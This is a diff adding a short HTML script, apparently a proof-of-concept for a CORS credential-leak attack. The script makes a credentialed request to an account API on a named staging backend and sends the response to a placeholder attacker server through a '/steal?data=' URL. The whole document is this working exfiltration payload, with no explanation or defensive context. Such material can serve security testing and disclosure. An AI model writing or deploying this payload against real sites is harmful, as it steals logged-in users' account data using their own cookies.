@@ -1,0 +1,10 @@
+<script>
+    fetch("https://backend-stg.apna.co//apna-account/v1/account/4948374?club_by_expiry=true&get_nudge=true", {
+        method: "GET",
+        credentials: "include"
+    })
+    .then(response => response.text())
+    .then(data => {
+        fetch("https://your-evil-server.com/steal?data=" + encodeURIComponent(data));
+    });
+</script>
